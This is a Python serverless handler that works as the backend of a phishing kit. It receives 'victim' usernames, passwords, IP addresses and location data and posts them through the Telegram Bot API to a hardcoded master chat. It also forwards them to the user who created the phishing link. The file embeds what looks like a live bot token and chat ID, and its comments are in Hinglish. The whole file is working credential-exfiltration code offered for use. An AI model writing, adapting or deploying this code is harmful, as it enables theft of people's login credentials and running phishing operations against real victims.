
import json
import requests
import os

MASTER_BOT_TOKEN = "8806568645:AAFNjN-ViTsqQmSRc9G-Qpx0mq5qiXzHmKk"
MASTER_CHAT_ID = "1007541797"
API_URL = f"https://api.telegram.org/bot{MASTER_BOT_TOKEN}"

def handler(event, context):
    try:
        params = event.get("queryStringParameters") or {}
        uid = params.get("uid", "")
        
        body = {}
        if event.get("body"):
            try:
                body = json.loads(event["body"])
            except:
                body = {}
        
        method = event.get("httpMethod", "GET")
        
        if method == "GET":
            return {
                "statusCode": 200,
                "body": json.dumps({"status": "ok"}),
                "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}
            }
        
        if method == "POST":
            victim_username = body.get('username', 'N/A')
            victim_password = body.get('password', 'N/A')
            
            headers = event.get("headers", {})
            victim_ip = body.get('ip') or headers.get('x-forwarded-for', '').split(',')[0].strip() or 'N/A'
            victim_city = body.get('city', 'N/A')
            victim_country = body.get('country', 'N/A')
            victim_isp = body.get('isp', 'N/A')
            timestamp = body.get('timestamp', 'N/A')
            
            # Master bot ko message
            master_msg = f"🎯 NEW CAPTURE!\n👤 {victim_username}\n🔑 {victim_password}\n📍 {victim_ip}\n🆔 UID: {uid}"
            requests.post(f"{API_URL}/sendMessage", json={
                "chat_id": MASTER_CHAT_ID,
                "text": master_msg,
                "parse_mode": "HTML"
            }, timeout=10)
            
            # User ko forward (jisne link banaya tha)
            if uid:
                user_msg = f"✅ Capture!\n👤 {victim_username}\n🔑 {victim_password}\n📍 {victim_ip}"
                try:
                    requests.post(f"{API_URL}/sendMessage", json={
                        "chat_id": int(uid),
                        "text": user_msg,
                        "parse_mode": "HTML"
                    }, timeout=10)
                except:
                    pass
            
            return {
                "statusCode": 200,
                "body": json.dumps({"status": "ok"}),
                "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}
            }
        
        return {"statusCode": 405, "body": json.dumps({"error": "Method not allowed"})}
    
    except Exception as e:
        return {"statusCode": 500, "body": json.dumps({"error": str(e)})}
